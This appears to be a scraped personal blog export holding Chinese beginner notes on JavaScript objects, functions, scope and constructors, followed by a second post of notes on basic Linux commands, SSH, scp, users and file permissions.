如果两个对象是一模一样的，但是地址不同，他也会返回false 对象字面量123456789101112131415161718192021222324252627282930313233&#x2F;&#x2F; 创建一个对象 &#x2F;&#x2F; var obj &#x3D; new Object(); &#x2F;* 使用对象字面量来创建一个对象 *&#x2F; &#x2F;&#x2F; 使用&#123;&#125;大括号创建对象和new Object()是一样的 &#x2F;&#x2F; 使用&#123;&#125;大括号更加方便 var obj &#x3D; &#123;&#125;; &#x2F;&#x2F;document.write(obj); obj.name &#x3D; &quot;Sun&quot; &#x2F;&#x2F;document.write(obj.name); &#x2F;* 使用对象字面量可以在创建对象时，直接指定对象中的属性 语法：&#123;属性名:属性值,属性名:属性值......&#125; 对象字面量的属性名可以加引号也可以不加，建议不加， 如果使用一些特殊的属性名，必须加引号 例如:&quot;@!#!@$&quot; 属性名和属性值是一组一组的名值对结构, 名和值之间使用 &quot;:&quot; 冒号连接，多个名值对之间使用 &quot;,&quot; 逗号隔开 如果只有一个属性，不跟其他属性就不要写 &quot;,&quot; 逗号了 *&#x2F; &#x2F;&#x2F; 创建了一个对象，同时为这个对象添加了一个属性 &#x2F;&#x2F; 属性的名字叫name，属性的值叫做 &quot;猪八戒&quot; &#x2F;&#x2F; 可以创建多个属性 var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, age:28, &#125;; &#x2F;&#x2F; 在页面输出 document.write(obj2.name,obj2.age); 函数的介绍12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;* 函数 - 函数也是一个对象 - 函数中可以封装一些功能(代码)，在需要时可以执行这些功能(代码) - 函数中可以保存一些代码在需要的时候调用 - 使用typeof检查一个函数对象时，会返回function *&#x2F; &#x2F;* 不使用这种构造函数 &#x2F;&#x2F; 在实际开发中很少使用构造函数对象 &#x2F;&#x2F; 创建一个函数对象 &#x2F;&#x2F; 可以将要封装的代码以字符串的形式传递给构造函数 &#x2F;&#x2F; var fun &#x3D; new Function(&quot;document.write(&#39;Hello 这是我的第一个函数&#39;);&quot;); &#x2F;&#x2F; 封装到函数中的代码不会立即执行 &#x2F;&#x2F; 函数中的代码会在函数调用的时候执行 &#x2F;&#x2F; 调用函数语法，函数对象() &#x2F;&#x2F; 当调用函数时，函数中封装的代码会按照顺序执行 &#x2F;&#x2F; fun(); &#x2F;&#x2F; document.write(typeof fun); &#x2F;&#x2F; document.write(fun); *&#x2F; &#x2F;* 使用函数声明来创建一个函数 语法: function 函数名([形参1,形参2...形参N])&#123; 语句.... &#125; *&#x2F; function fun2()&#123; document.write(&quot;这是我的第二个函数&quot;); alert(&quot;哈哈哈哈&quot;); console.log(&quot;&#x2F;(ㄒoㄒ)&#x2F;~~&quot;); &#125; &#x2F;&#x2F; 调用fun2 &#x2F;&#x2F; fun2(); &#x2F;* 使用函数表达式来创建一个函数 var 函数名 &#x3D; function([形参1,形参2...形参N])&#123; 语句... &#125; *&#x2F; var fun3 &#x3D; function()&#123; document.write(&quot;匿名函数&quot;); &#125; fun3(); 函数参数12345678910111213141516171819202122232425262728293031323334&#x2F;* 定义一个用来求两个数的和的函数 可以在函数的()中来指定一个或多个形参(形式参数) 多个形参之间使用,号隔开，声明形参就相当于在函数内部声明了对应的变量 但是并不赋值 *&#x2F; function sum(a,b)&#123; document.write(a+b); &#125; &#x2F;* 在调用函数时，可以在()中指定实参 实参将会赋值给函数中对应的形参 *&#x2F; &#x2F;* &#x2F;&#x2F; sum(5,2); sum(123,56); sum(123,&quot;hello&quot;); *&#x2F; &#x2F;* 调用函数时，解析器不会检查实参类型 所以要注意是否有可能会接收到非法的参数，如果有可能则要对我们的参数进行类型检查 函数的实参可以是任意的数据类型 *&#x2F; &#x2F;* 调用函数时，解析器也不会检查实参数量 多余的实参不会被赋值 如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined *&#x2F; &#x2F;&#x2F; sum(123,456,1); 函数的返回值123456789101112131415161718192021222324252627&#x2F;* 创建一个函数，用来计算三个数的和 可以使用return 来设置函数的返回值 语法： return 值 return后的值将会作为函数的执行结果返回， 可以定义一个变量，来接收该结果 在函数中return后的语句都不会被执行 如果return语句后面不跟任何值就相当于返回一个undefined 如果函数中不屑return,则也会返回undefined return后可以跟任意类型的值 *&#x2F; function sum(a,b,c)&#123; &#x2F;&#x2F; document.write(a+b+c); var d &#x3D; a+b+c; return d; &#125; &#x2F;&#x2F; 调用函数 &#x2F;&#x2F; 变量return的值就是函数的执行结果 &#x2F;&#x2F; 函数返回什么result的值就是什么 var result &#x3D; sum(1,2,3); document.write(&quot;result &#x3D; &quot;+ result); 立即执行函数1234567891011121314151617181920&#x2F;&#x2F; 如果直接写匿名函数执行会报错，如果用()括号将他圈起来， &#x2F;&#x2F; 整明他是一个整体就不会报错 (function()&#123; alert(&quot;匿名函数~~&quot;); &#125;); &#x2F;&#x2F; 函数对象() &#x2F;* 立即执行函数 函数定义完，立即被调用，这种函数叫做立即执行函数 立即执行往往只会执行1次 *&#x2F; &#x2F;* (function()&#123; alert(&quot;匿名函数~~&quot;); &#125;)(); *&#x2F; (function(a,b)&#123; document.write(&quot;a &#x3D; &quot;+ a); document.write(&quot;b &#x3D; &quot;+ b); &#125;)(123,222); 枚举对象中的属性12345678910111213141516171819202122232425262728293031&#x2F;* 枚举对象中的属性 *&#x2F; var obj &#x3D; &#123; name:&quot;孙悟空&quot;, age:18, gender:&quot;男&quot;, address:&quot;花果山&quot; &#125;; &#x2F;&#x2F; 例如我们不知道obj中的属性， &#x2F;&#x2F; 但是我们想要知道obj中都有什么属性 &#x2F;&#x2F; 枚举对象中的属性 &#x2F;&#x2F; 使用for in 语句 &#x2F;* 语法： for(var 变量 in 对象)&#123; 语句... &#125; for...in语句，对象中有几个属性，循环体就会执行几次 每次执行时，会将对象中的一个属性的名字赋值给变量 *&#x2F; &#x2F;* for(var n in obj)&#123; document.write(&quot;属性名&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;); &#125; *&#x2F; for(var n in obj)&#123; document.write(&quot;属性名 :&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;); document.write(obj[n]+&quot;&lt;br &#x2F;&gt;&quot;); &#125; 作用域123456789101112131415161718192021222324作用域 - 作用域指一个变量的作用的范围 - 在JS中一共有两种作用域： 1、全局作用域 - 直接编写在scripe标签中的JS代码，都在全局作用域中 - 全局作用域在页面打开时创建，在页面关闭时销毁 - 在全局作用域中有一个全局对象window， 它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用 - 在全局作用域中， 创建的变量都会作为window对象的属性保存 创建的函数都会做为window对象的方法保存 - 全局作用域中的变量都是全局变量， 在页面的任意的部分都可以访问到 2、函数作用域 *&#x2F; var a &#x3D; 10 &#x2F;&#x2F; console.log(window.a); function fun()&#123; console.log(&quot;Fun函数&quot;); &#125; 变量的声明提前12345678910111213141516171819202122232425262728&#x2F;* 变量的声明提前 - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值） 但是如果声明变量时不使用var关键字，则变量不会被提前声明 函数的声明提前 - 使用函数声明形式创建的函数function 函数()&#123;&#125; 他会在所有代码执行之前就被创建，所以我们可以在函数声明前来调用函数 使用函数表达式创建的函数，不能被声明提前，所以不能在声明前调用 *&#x2F; console.log(&quot;a &#x3D; &quot;+a); var a &#x3D; 123; &#x2F;&#x2F;fun(); fun2() &#x2F;&#x2F; 函数声明，会被提前创建 function fun()&#123; console.log(&quot;Fun函数&quot;); &#125; &#x2F;&#x2F; 变量会被提前创建，但是函数表达式不会被提前创建 var fun2 &#x3D; function()&#123; console.log(&quot;Fun函数2&quot;); &#125;; 函数作用域12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#x2F;* 函数作用域 - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁 - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的 - 在函数作用域中可以访问到全局变量，在全局作用域中无法访问到函数作用的变量 可以理解为:内部可以访问外部，但外部不能访问内部 - 当在函数作用域操作一个变量时，他会先在自身作用域寻找，如果有就直接使用 如果没有则向上一级作用域寻找，直到找到全局作用域 如果全局作用域中依然没有找到，则会报错ReferenceError - 在函数中要访问全局变量可以使用window对象 *&#x2F; &#x2F;* var a &#x3D; 10 function fun()&#123; var b &#x3D; 20; console.log(&quot;a &#x3D; &quot;+a); &#125; fun(); cosole.log(&quot;b &#x3D; &quot;+b); *&#x2F; &#x2F;* 在函数作用域中也有声明提前的特性， 使用var关键字声明变量，会在函数中所有的代码执行之前被声明 函数声明也会在函数中所有的代码执行之前执行 *&#x2F; function fun3()&#123; fun4(); &#x2F;&#x2F; console.log(a); &#x2F;&#x2F; 返回undefined ,因为定义的变量在下面，var a 已经提前声明好了，但是没赋值 var a &#x3D; 35; function fun4()&#123; alert(&quot;fun4函数能否被调用&quot;); &#125; &#125; fun3(); var c &#x3D; 22; &#x2F;* 在函数中，不使用var声明的变量都会成为全局变量 *&#x2F; function fun5()&#123; &#x2F;&#x2F; console.log(&quot;c &#x3D; &quot;+ c); c &#x3D; 10; &#125; fun5 this123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&#x2F;* 解析器在调用函数每次都会向函数内部传递进一个隐含的参数 这个隐含参数就是this.this指向的是一个都西昂， 这个对象我们称为函数执行的上下文对象 根据函数的调用方式不同，this会指向不同的对象 1、以函数的形式调用时，this永远都是window 2、以方法的形式调用是，this就是调用方法的那个对象 *&#x2F; &#x2F;* function fun()&#123; &#x2F;&#x2F; console.log(&quot;a &#x3D; &quot;+a+&quot;b &#x3D; &quot;+b); console.log(this.name); &#125; &#x2F;&#x2F; fun(); var obj&#x3D;&#123; name:&quot;孙悟空&quot;, sayName:fun &#125;; var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, sayName:fun &#125;; &#x2F;&#x2F; console.log(obj.sayName &#x3D;&#x3D; fun); var name &#x3D; &quot;全局的name属性&quot;; &#x2F;&#x2F; obj.sayName(); &#x2F;&#x2F; 以函数的而形式调用，this是window &#x2F;&#x2F; fun(); &#x2F;&#x2F; 以方法的形式调用，this是调用方法的对象 &#x2F;&#x2F; obj.sayName(); *&#x2F; &#x2F;&#x2F; 创建一个name变量 var name &#x3D; &quot;全局&quot;; obj2.sayName(); &#x2F;&#x2F; 创建一个fun()函数 function fun()&#123; console.log(this.name); &#125;; &#x2F;&#x2F; 创建两个对象 var obj &#x3D; &#123; name:&quot;孙悟空&quot;, sayName:fun &#125;; var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, sayName:fun &#125;; &#x2F;&#x2F; 我们调用sayName()时可以输出obj的名字 obj.sayName(); 使用工厂方法创建对象1234567891011121314151617181920212223242526272829303132333435&#x2F;* 创建一个对象 *&#x2F; &#x2F;* var obj &#x3D; &#123; name:&quot;孙悟空&quot;, age:18, gender:&quot;男&quot;, sayName:function()&#123; alert(this.name); &#125; &#125;; *&#x2F; &#x2F;* 使用工厂方法创建对象 *&#x2F; function createPerson(name,age,gender)&#123; &#x2F;&#x2F; 创建一个新的对象 var obj &#x3D;new Object(); &#x2F;&#x2F; 向对象中添加属性 obj.name&#x3D;name; obj.age&#x3D;age; obj.gender&#x3D;gender; obj.sayName&#x3D;function()&#123; alert(this.name); &#125;; &#x2F;&#x2F; 将新的对象返回 return obj; &#125; var obj2 &#x3D; createPerson(&quot;猪八戒&quot;,16,&quot;男&quot;); var obj3 &#x3D; createPerson(&quot;玉兔精&quot;,22,&quot;女&quot;); var obj4 &#x3D; createPerson(&quot;唐僧&quot;,25,&quot;男&quot;); obj3.sayName(); 构造函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&#x2F;* 创建一个构造函数，专门用来创建Person对象的 构造函数就是一个普通的函数，创建方式和普通函数没有区别 不同的是，构造函数习惯上首字母大写 构造函数和普通函数的区别就是调用方式的不同 普通函数就是直接调用，而构造函数需要使用new关键字来调用 构造函数执行流程 1、立刻创建一个新的对象 2、将新建的对象设置为函数中的this,在构造函数中可以使用this来引用新建的对象 3、逐行执行函数中的代码 4、将新建的对象作为返回值返回 使用同一个构造函数创建的对象，我们称为一类对象 我们将通过一个构造函数创建的对象，称为是该类的实例 this的情况 1、当以函数的形式调用时，this是window 2、当以方法的形式调用时，谁调用方法this就是谁 3、当以构造函数的形式调用时，this就是新创建的那个对象 *&#x2F; function Person(name,age)&#123; this.name &#x3D; name; this.age &#x3D; age; this.sayName &#x3D; function()&#123; alert(this.name); &#125;; &#125; var per &#x3D; new Person(&quot;孙悟空&quot;,18); var per2 &#x3D; new Person(&quot;猪八戒&quot;,20); &#x2F;* console.log(per); console.log(per2); *&#x2F; &#x2F;* 使用instanceof可以检查一个对象是否是一个类的实例 语法: 对象 instanceof 构造函数 如果是返回true，否则返回false *&#x2F; &#x2F;* 所有的对象都是Object的后代， 所以任何对象和Object做instanceof检查时都会返回true *&#x2F; console.log(per instanceof Person); &#x2F;* 用来创建狗的对象 *&#x2F; &#x2F;* function createDog(name,age)&#123; var obj &#x3D; new Object(); obj.name &#x3D; name; obj.age &#x3D; age; obj.sayHello &#x3D; function()&#123; alert(&quot;汪汪~~~&quot;); &#125;; return obj; &#125; *&#x2F; &#x2F;* 使用工厂方法创建的对象，使用的构造函数都是Object 所以创建的对象都是Object这个类型 就导致我们无法区分出多种不同类型的对象 *&#x2F; &#x2F;&#x2F; var dog &#x3D; createDog(&quot;大福&quot;,3); &#x2F;&#x2F; dog.sayHello();","categories":[],"tags":[]},{"title":"linux笔记 ","slug":"linux笔记 ","date":"2020-04-03T06:32:04.233Z","updated":"2020-04-03T06:31:30.000Z","comments":true,"path":"2020/04/03/linux笔记 /","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/linux%E7%AC%94%E8%AE%B0%20/","excerpt":"","text":"常用 Linux 命令的基本使用目标 理解学习 Linux 终端命令的原因 常用 Linux 命令体验 01. 学习 Linux 终端命令的原因 Linux 刚面世时并没有图形界面，所有的操作全靠命令完成，如 磁盘操作、文件存取、目录操作、进程管理、文件权限 设定等 在职场中，大量的 服务器维护工作 都是在 远程 通过 SSH 客户端 来完成的，并没有图形界面，所有的维护工作都需要通过命令来完成 在职场中，作为后端程序员，必须要或多或少的掌握一些 Linux 常用的终端命令 Linux 发行版本的命令大概有 200 多个，但是常用的命令只有 10 多个而已 学习终端命令的技巧： 不需要死记硬背，对于常用命令，用的多了，自然就记住了 不要尝试一次学会所有的命令，有些命令是非常不常用的，临时遇到，临时百度就可以 02. 常用 Linux 命令的基本使用 序号 命令 对应英文 作用 01 ls list 查看当前文件夹下的内容 02 pwd print wrok directory 查看当前所在文件夹 03 cd [目录名] change directory 切换文件夹 04 touch [文件名] touch 如果文件不存在，新建文件 05 mkdir [目录名] make directory 创建目录 06 rm [文件名] remove 删除指定的文件名 07 clear clear 清屏 小技巧 ctrl + shift + = 放大终端窗口的字体显示 ctrl + - 缩小终端窗口的字体显示 03. 自动补全 在敲出文件目录命令的前几个字母之后，按下 tab 键 如果输入的没有歧义，系统会自动补全 如果还存在其他 文件／目录／命令，再按一下 tab 键，系统会提示可能存在的命令 小技巧 按 上／下 光标键可以在曾经使用过的命令之间来回切换 如果想要退出选择，并且不想执行当前选中的命令，可以按 ctrl + c Linux 终端命令格式目标 了解终端命令格式 知道如何查阅终端命令帮助信息 01. 终端命令格式1command [-options] [parameter] 说明： command：命令名，相应功能的英文单词或单词的缩写 [-options]：选项，可用来对命令进行控制，也可以省略 parameter：传给命令的参数，可以是 零个、一个 或者 多个 [] 代表可选 02. 查阅命令帮助信息（知道） 提示 现阶段只需要 知道 通过以下两种方式可以查询命令的帮助信息 先学习常用命令及常用选项的使用即可，工作中如果遇到问题可以借助 网络搜索 2.1 --help1command --help 说明： 显示 command 命令的帮助信息 2.2 man1man command 说明： 查阅 command 命令的使用手册 man 是 manual 的缩写，是 Linux 提供的一个 手册，包含了绝大部分的命令、函数的详细使用说明 使用 man 时的操作键： 操作键 功能 空格键 显示手册页的下一屏 Enter 键 一次滚动手册页的一行 b 回滚一屏 f 前滚一屏 q 退出 /word 搜索 word 字符串 3.1 touch命令 如果文件不存在，可以创建一个文件 如果文件已经存在 可以修改文件的末次日期。 3.2mkdir 创建一个新的目录 选项 含义 -p 可以递归创建目录 意思可以在目录中连续创建多个目录 新建目录名称和文件是不可以重名的。 如果使用同名文件夹会报错显示已存在文件。 ~/目录 可以进入想要进入的家目录。 3.4 rmrm 只能删除文件 ， rm后加-r可以删除文件或者目录。 *rm删除文件或者目录后是不可以恢复的，因为rm命令是直接从磁盘中删除。所以使用rm命令时需要谨慎使用避免删错。 * 使用rm时看好在那个目录下，防止删除系统内容，导致系统瘫痪。 选项 含义 -f 强制删除文件，如果文件不存在是不提示错误的。 ** **-f只能删除文件，是不可以强制删除目录的 -r 可以删除目录中所有内容，删除目录时必须加-r 通配符也可以在rm中使用，rm -r * 可以清除所有文件和目录。 0.4 拷贝和移动文件4.1tree 序号 命令 作用 01 tree[目录名] tree命令是以树状图列出目录结构 02 cp 源文件 目标文件 复制文件或者目录 03 mv 源文件 目标文件 移动文件或者目录/文件或者目录重名 tree 加~ 可以显示家目录下所有文件和目录。 tree 加-d 只显示目录。 directories 表示目录 files 表示文件 4.2 cp 选项 含义 -i 覆盖文件时候提示是否覆盖 -r 复制文件时在cp后面加-r 复制完成的文件会把源文件下所有子目录和文件复制过去 ，但目标文件需要重命名。 4.3 mvmv命令可以用来移动文件或者目录，也可以给文件或者目录重命名。 mv命令后加-i 可以提示是否覆盖文件或者目录以防发生覆盖错误。 使用mv命令时如果加入-i 出现存在文件会提示我们是否覆盖，这样在使用的时候会更加安全。因为文件或目录覆盖和删除后时没办法恢复的。 05 查看文件内容、 命令 作用 cat 文件名 查看文件内容、创建文件、文件合并、追加文件内容等功能 more 文件名 分屏显示文件内容 grep 搜索内容文件名 搜索文本文件内容 5.1 catcat 查看文件内容、创建文件、文件合并、追加文件内容等功能 cat 会一次显示所有的内容，适合 查看内容较少的文本文件 选项 含义 -b 对非空输出行编号 将空开的行不给予行号 -n 对输出的所有行编号 将所有行都给予行号 Linux 中还有一个nl的命令和cat -b 的效果等价 5.2 moremore命令可以用于分屏显示文件内容，每次只显示一页内容 适合查看内容较多的文本文件 操作键 功能 空格键 显示手册页的下一屏 回车键 一次滚动手册页的一行 b 回滚一屏 f 前滚一屏 q 退出 /word 搜索 word字符串 空格键和F键功能是一样的。 5.3 grepLinux 系统中 grep 命令是一种强大的文本搜索工具 grep 允许对文本文件进行 模式查找，所谓模式查找，又被称为正则表达式， 选项 含义 -n 显示匹配行及行号 既显示内容又显示行号 -v 显示不包含匹配文本的所有行（相当于取反搜索） 省略你想要搜索的内容 -i 忽略大小写 grep 可以查找文本中你想要找到的内容 grep -vn 将-n和-v 合并 显示行号但不显示你所查找的内容 grep -i 的时候 如果搜索内容中间有空格需要用引号将你所要搜索的内容引起来。 常用的两种模式查找 参数 含义 ^a 行首，搜索以a开头的行 ke$ 行尾，搜索以ke结束的行 ^(你所要找的行首内容) (你所要找的行尾内容)$ 0.6其他6.1 echo 文字内容echo 会在终端中显示参数指定的文字，通常会和 重定向 联合使用 ceho 是将你想要显示指定文字在显示一边 echo 很少会单独使用 6.2重定向 &gt; 和 &gt;&gt;Linux 允许将命令执行结果 重定向 到一个文件 将本应显示在终端上的内容输出 / 追加到指定文件中 · &gt; 表示输出，会覆盖你源文件的全部内容。 · &gt;&gt;表示追加，会将内容追加到已有文件的末尾. 使用 &gt; 时 要谨慎使用，防止将重要文件覆盖。 在你想要使用 &gt; &gt;&gt; 等命令后面加上文件名 6.3 管道|Linux 允许将 一个命令的输出 可以 通过管道 做为 另一个命令的输入 这里|可以理解为管子，左端塞东西（写），右端去东西（读） 常用管道命令： more：分屏显示内容 grep：在命令执行结果的基础上查询指定的文本。 远程管理常用命令目标 关机/重启 shutdown 查看或配置网卡信息 ifconfig ping 远程登陆和复制文件 ssh scp 01.关机/重启 命令 作用 shutdown 选项 时间 关机/重新启动 想要重新启动电脑或者关闭电脑可以在终端中先输入shutdown 在指令选项（关机/重启）并接上一个关机/重新启动的时间 如果向立即关闭 电脑 只需要在 shutdown 关机/重启电脑 now 只需要在时间那里输入一个now。 如果 不指令任何选项，默认的将会是关机， 选项 含义 -r 重新启动 如果想要重启电脑，只需要加入一个 -r 的指令。 提示： 如果不指定时间参数，系统默认一分钟之后关闭电脑 如果后悔 在shutdown 后面加-c 表示取消关机 而这个操作需要在一分钟之内完成，也就是关机之前完成操作。 远程维护服务器时，最好不好关闭系统，而应该重新启动系统 我们在输入 shutdown 指令时千万不要忘记输入 -r 指令 如果忘记输入-r 立刻加 -c 取消关机 常用命令示例 1234567891011121314# 重新启动操作系统，其中 now 表示现在立即$ shutdown -r now# 立即关机，其中 now 表示现在$ shutdown now# 系统在今天的20：25会关机$ shutdown 20:25# 系统在过十分钟自动关机$ shutdown +10# 取消之前指定的关机计划$ shutdown -c 02.查看或配置网卡信息 命令 作用 ifconfig 查看/配置计算机当前的网卡配置信息 ping ip地址 检测到目标 ip地址的链接是否正常 2.1 网卡和IP地址网卡 网卡是一个专门负责网络通讯的硬件设备 IP地址是设置在网卡上的地址信息 我们可以把电脑比作电话，网卡相当于SIM卡，ip地址相当于电话号码 ip地址 每台联网的电脑上都有ip地址，是帮正电脑之间正常通讯的重要设置 注意：每台电脑的ip地址不能相同，否则会出现ip冲突，并且没有办法正常通讯。 2.2 ifconfigifconfig 可以查看/配置计算机当前的网卡配置信息 12345# 查看网卡配置信息$ ifconfig# 查看网卡对应的Ip地址$ ifconfig | grep inet inet 地址 是IP地址，如果内容太多只想显示ip地址命令，可以利用管道命令来显示。 提示：一台计算机中有可能会有一个 物理网卡 和 多个虚拟网卡， 在Linux 中物理网卡的名字通常以 ensXX 表示 127.0.0.1 被称为 本地回环/环回地址，一般用来测试本机网卡是否正常 2.3 ping12345# 检测到目标主机是否连接正常$ ping IP地址# 检测本地网卡工作正常$ ping 127.0.0.1 ping 一般用于检测当前计算机到目标计算机之间的网络 是否通畅， 数值越大 ， 速度越慢 。 要使用 ping命令，必须要知道目标主机的 IP地址 意思是，目标主机无法到达。也就是说 当前ip地址和我们计算机并没有网络连接。 如果使用 ping 127.0.0.1 有回馈就说明我们本地网卡是通的。 3.1 ssh 基础 （重点内容）在Linux 中 SSH 是非常常用 的工具，通过 SSH客户端 我们可以连接到运行了SSH服务器 的远程机器上 SSH是个软件不管是客户端还是服务器 工作方式：当两个软件安装到位之后，我们就可以在自己的电脑上通过网络远程登录到服务器上，对服务器进行日常管理和维护。 在Ubuntu中SSH是默认安装的 只有在windows系统下需要专门安装客户端进行远程维护。 SSH是目前较可靠， 专为远程登录会话和其他网络服务 提供安全性的协议 利用SSH协议 可以有效防止远程管理过程中的信息泄露 通过SSH协议 可以对所有传输的数据进行加密，也能够防止DNS欺骗和 IP 欺骗 SSH 的另一项优点是传输的数据可以是经过压缩的，所以也可以加快传输的速度 1）域名 和 端口号域名 由一串 用点分隔 的名字组成，例如：www.itcast.cn 是IP地址的别名，方便用户记忆 端口号 IP地址：通过 IP地址 找到网络上的 计算机 端口号：通过 端口号 可以找到 计算机上运行的应用程序 ip 地址：端口号 这两个命令一个不能少 每个服务器都有默认的端口，如果我们在访问服务器的时候没有指定端口，那它用的则是默认端口。 SSH服务器的默认端口是22，如果是默认端口号，再连接的时候，可以省略 常见的服务器端口号列表： 服务 端口号 SSH服务器 22 Web服务器 80 HTTPS 443 FTP服务器 21 2）SSH 客户端的简单使用12ssh [-p port] user@remote如果 你所用的port 就是默认端口号 前面的-p可以省略，如果不是则需要加上-p 跟上指定端口号。 user 是在远程机器上的用户名，如果不指定的话默认为当前用户 remote 是远程机器的地址，可以是 ip/域名，或者是 别名 port 是SSH Server 监听的端口，如果不指定，就为默认值22 提示： 使用exit 退出当前用户的登录 注意： ssh 这个终端命令 只能在linux 或者 unix 系统下使用 如果在Windows系统中，可以安装PuTTY或者 XShell 客户端软件即可 提示： 在工作中，SSH服务器的端口号很有可能 不是22，如果遇到这种情况就需要使用 -p 选项，指定正确的端口号，否侧无法正常连接到服务器。 3）Windows下SSH客户端的安装 3.2 scp （掌握） scp是一个在Linux下用来进行 远程拷贝文件 的命令 它的 地址格式与 ssh 基本相同 ，需要注意的是，在指定端口时用的是大写的 -P而不是小写的。 可以将我们的文件拷贝到服务器里，也可以将服务器里的文件拷贝到我们的客户端 123456# 把本地当前目录下的11245.txt文件 复制到 远程 家目录下的 文档&#x2F;11245.txt# 注意：“：”后面的路径如果不是绝对路径，则以用户的家目录做为参照路径scp -P port 1124.txt user@remote：桌面&#x2F;11245.txt#把远程 家目录下的 桌面&#x2F;1124.txt 文件 复制到 本地当前目录下的 11245.txtscp -P pore user@remote:桌面&#x2F;11245.txt 11245.txt 选项 含义 -r 如给出的源文件是目录文件，则scp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名 -p 若远程SSH服务器的端口不是22，需要使用大写字母-P选项指定端口 SSH 高级 （知道）SSH配置信息都保存在用户家目录下的 .ssh 目录下 免密码登录 scp -p 22 用户名/ip cat known_hosts(记录第一次连接主机的授权码)ls 配置公钥 执行 ssh-keygen即可生成SSH钥匙，一路回车即可 上传公钥到服务器 执行 ssh-copy-id -p 用户名@ip ，可以让远程服务器记住我们的公钥 公钥和私钥 进行免密码登录首先执行ssh-keygen这个命令，这个命令可以生成两个文件，一个带点的一个 id_rsa.pub 一个不带点的id_rsa 而带点的文件我们称他为公钥，而不带点的文件我们称他为私钥。 所谓公钥就是公共加密的钥匙，而私钥就是私用加密的钥匙 使用公钥加密的钥匙，我们必须要用私钥进行解密，而反过来呢，使用私钥加密的钥匙，我们必须要用公钥解密 2)配置别名每次输入 ssh -p port user@remote, 时间久了会觉得很麻烦，特别是当 ueer 和port都得输入，还不好记忆。 而配置别名可以让我们进一步偷懒，譬如 ssh mac 来代替上面这么一长串，那么就 在~/.ssh/config 里面追加以下内容： Host mac HostName ip 地址 User itheima port 22 保存之后即可用 ssh mac 实现远程登录了，scp同样可以使用 用户和权限的基本概念1.1 基本概念用户是Linux 系统工作中重要的一环，用户管理包括 用户 与 组 管理 在Linux系统中，不论是由本机或是远程登陆系统，每个系统都必须拥有一个账号并且对于不同的系统资源拥有不同的使用权限 在Linux中，可以指定 每一个用户 针对 不用的文件或者目录 的 不同权限 对 文件/目录 的而权限包括： 权限 英文 缩写 数字代号 读 read r 4 写 write w 2 执行 excute x 1 1.3 ls -l扩展r 表示可读的意思 w 表示可写的意思 x 表示可执行的意思 1.4 chmod 简单使用（重要）chmod 可以修改 用户/组 对 文件/目录 的权限 命令格式如下： 1chmod +&#x2F;-rwx 文件名|目录名 gedit 打开文件 可以进行编写。 1.5 超级用户 0.2 组管理终端命令创建 组/删除组 的终端命令都需要 sudo 执行 ch表示修改 grp 表示组 -R 文件 目录名 提示： 组信息保存在/etc/group 文件中 /etc 目录是专门用来保存 系统配置信息 的目录 0.3 创建用户/设置密码/删除用户add 表示添加的意思 命令 作用 说明 useradd -m -g 组名 新建用户名 添加新用户 -m 自动建立用户家目录-g用户所在的组 passwd 用户名 设置用户密码 如果是普通用户，直接用passwd可以修改自己的账户密码 userdel -r 用户名 删除用户 -r 选项会自动删除用户家目录 cat /etc/passwd | grep 用户名 确认用户信息 新建用户后，用户信息会保存在/etc/passwd文件中 3.2 查看用户信息 命令 作用 id [用户名] 查看用户UID和GID信息 who 查看当前所有登录的用户列表 whoami 查看当前登录用户的账户名 passwd 文件 /etc/passwd 文件存放的是用户的信息，由6个分号组成的7个信息，分别是： 1.用户名 2.密码（x，表示加密的密码） 3.UID（用户标识） 4.GID（组标识） 5.用户全名或者本地账号 6.家目录 7.登录使用的Shell，就是登录之后，使用的只能终端命令，Ubuntu默认是dash 在passwd中是以冒号来分组信息的每一个冒号分隔一个信息 介绍： 一开始 表示当前用户名，第二个 x 表示这个用户是有密码的，但是密码是加密的，第三个1001表示用户名的代号，后面的1001表示lisi这个用户所归属的组的代号，：：这一列是空的表示lisi用户的全名，如果没有设置就用用户名做为lisi的全名 /home/lisi 表示用户所在的家目录 usermod usermod -g 组 用户名 修改的是主组 usermod -G 组 用户名 修改的是附加组 which（重要）/etc/passwd 用于保存用户信息的文件 /usr/bin/passwd 用于修改用户密码的程序 which 命令可以查询我们能执行终端命令所在位置。 3.3 切换用户 命令 作用 说明 su - 用户名 切换用户，并且切换目录 - 可以切换到用户家目录，否则保持位置不变 exit 退出当前登录账户 su 不接用户名，可以切换到root身份，root对系统所有资源都有管理权限，不推荐使用，因为不安全。 0.4 修改文件权限 命令 作用 chown 修改拥有者 chgrp 修改组 chmod 修改权限 12345678# 修改文件 | 目录拥有者chown 用户名 文件名 | 目录名 # 递归修改文件|目录的组chgrp -R 组名 文件名|目录名#递归修改文件权限chmod -R 755 文件名|目录名 chmod 在设置权限时，可以简单地使用三个数字分别对应 7表示拥有者的意思第二个5表示组的意思 和 第三个5表示其他用户的权限 1# chmod+&#x2F;-rwx 可以直接修改文件|目录的 读|写|执行 权限，但是不能精确到 拥有者|组|其他 系统信息相关命令学习目标 通过远程终端维护服务器时，查看服务器上当前 系统日期和时间/磁盘空间占用情况/程序执行情况 本小结学习的终端命令进本都是查询命令，通过这些命令对系统资源的使用情况有个了解 目标 时间和日期 date cal 磁盘和目录空间 df du 进程信息 ps top kill 01.时间和日期 命令 作用 date 查看系统时间 cal calendar 查看日历，-y选项可以查看一年的日历 02.磁盘信息 命令 作用 df -h 显示磁盘剩余空间 du -h [目录名] 显示目录下的文件大小 选项说明 参数 含义 -h 以人性化的方式显示文件大小 03.进程信息 所谓进程，通俗的说就是 当前正在执行的一个程序 命令 作用 ps aux process status查看进程的详细状况 top 动态显示运行中的进程并且排序 kill[-9] 进程代号 终止指定代号的进程，-9 表示强行终止 ps 